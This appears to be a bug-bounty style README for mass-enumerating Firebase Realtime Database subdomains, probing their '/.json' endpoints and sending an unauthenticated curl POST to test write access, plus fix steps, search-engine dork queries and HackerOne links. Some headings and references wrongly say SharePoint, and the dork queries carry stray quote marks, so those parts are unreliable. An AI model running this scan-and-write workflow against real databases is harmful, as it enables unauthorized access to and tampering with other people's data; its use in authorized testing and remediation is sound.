
# 📝 Firebase Subdomain Enumeration & PoC Testing

This repository provides a workflow to find subdomains of `firebaseio.com`, test them for public accessibility, and exploit a `.json` endpoint to check for write vulnerabilities. Additionally, mitigation steps are provided to fix the issue.

## ⌛ Requirements
- [Subfinder](https://github.com/projectdiscovery/subfinder)
- [Httpx](https://github.com/projectdiscovery/httpx)
- Curl

## 🔍 Workflow

### ✅ Subdomain Enumeration
Use `subfinder` to enumerate subdomains for `firebaseio.com`:

```bash
subfinder -d firebaseio.com -o subdomains.txt
```

### ✅ Test Subdomains
Once subdomains are collected, use `httpx` to check `.json` endpoints for accessible responses (HTTP status code 200):

```bash
httpx -l subdomains.txt -path "/.json" -mc 200 -o valid_subdomains.txt
```

### ✅ PoC Testing
Use `curl` to send a POST request to the `.json` endpoint to test if data can be written without authentication:

```bash
curl -X POST https://<subdomain>.firebaseio.com/.json -d '{"test":"poc"}' -H "Content-Type: application/json"
```

If successful, the server is vulnerable to unauthenticated write access.

### 🔨 How to Fix it :
To secure the Firebase database:

1. **Set Firebase Database Rules**:
   - Open the Firebase Console.
   - Go to *Database > Rules*.
   - Update the rules to restrict access only to authenticated users. Example:
     ```json
     {
       "rules": {
         ".read": "auth != null",
         ".write": "auth != null"
       }
     }
     ```

2. **Audit Subdomains**:
   - Ensure there are no unused or publicly misconfigured Firebase databases.

3. **Monitor Activity Logs**:
   - Use Firebase to monitor access logs for suspicious activities.
   
## 📝 Alternative Methods to Identify SharePoint Sites

### Using Search Engines
- **FOFA**:  
  Query: `header="domain="firebaseio.com""`

- **Shodan**:  
  Query: `http.title:"Firebase""`

- **ZoomEye**:  
  Query: `site:"firebaseio.com""`

## ⭐ References

Here are real-world examples of SharePoint vulnerabilities reported on HackerOne :

- [HackerOne Report 1065134](https://hackerone.com/reports/1065134)  
- [HackerOne Report 1447751](https://hackerone.com/reports/1447751)  
- [HackerOne Report 736283](https://hackerone.com/reports/736283)  
- [HackerOne Report 684099](https://hackerone.com/reports/684099)


## ⚠️ Disclaimer
This script is intended for educational purposes and for security testing of systems you own or have explicit permission to test. Do not use this for unauthorized activities.

## 💰 Support Me  

If you find this work helpful, you can support me:  
- [![Buy Me a Coffee](https://www.buymeacoffee.com/assets/img/custom_images/yellow_img.png)](https://buymeacoffee.com/ghost_sec)  

Thanks for your support! ❤️
